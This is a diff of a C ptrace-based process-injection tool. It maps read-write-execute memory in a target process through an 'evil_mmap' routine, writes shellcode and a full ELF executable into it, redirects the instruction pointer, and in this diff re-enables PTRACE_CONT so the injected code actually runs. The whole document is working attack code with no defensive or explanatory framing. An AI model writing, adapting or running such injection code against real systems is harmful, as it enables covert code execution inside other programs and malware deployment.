@@ -11,7 +11,7 @@
 
 #include "ptrace_interface.h"
 #include <asm/ptrace.h>
-static inline volatile void *evil_mmap(void *addr, size_t length, int prot, int flags,
+static __attribute__((aligned(8),__always_inline__)) inline volatile void *evil_mmap(void *addr, size_t length, int prot, int flags,
                               int fd, off_t offset)
 {
     long mmap_fd = fd;
@@ -29,7 +29,7 @@ static inline volatile void *evil_mmap(void *addr, size_t length, int prot, int 
     __asm__ volatile("mov %%rax, %0\n": "=r"(ret));
     return (void *)ret;
 }
-uint64_t injection_code(void *vaddr)
+__attribute__((aligned(8))) uint64_t injection_code(void *vaddr)
 {
     volatile void *mem;
     mem = evil_mmap(vaddr, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, 1, 0);
@@ -86,7 +86,7 @@ int main(int argc, char **argv)
     ptrace_write((void *)shellcode, shellcode_size, (void *)base_addr, pid);
 
     ptrace(PTRACE_GETREGS, pid, NULL, &pt_reg);
-    pt_reg.rip = base_addr;
+    pt_reg.rip = base_addr + 2;
     pt_reg.rdi = BASE_ADDRESS;
 
     ptrace(PTRACE_SETREGS, pid, NULL, &pt_reg);
@@ -114,11 +114,11 @@ int main(int argc, char **argv)
 
     ptrace_write(executable, st.st_size, (void *)BASE_ADDRESS, pid);
     ptrace(PTRACE_GETREGS, pid, NULL, &pt_reg);
-    pt_reg.rip = BASE_ADDRESS + ehdr->e_entry;
+    pt_reg.rip = BASE_ADDRESS + ehdr->e_entry + 2;
 
     ptrace(PTRACE_SETREGS, pid, NULL, &pt_reg);
 
-    //ptrace(PTRACE_CONT, pid, NULL, NULL);
+    ptrace(PTRACE_CONT, pid, NULL, NULL);
     ptrace_detach(pid);
 
     wait(&status);
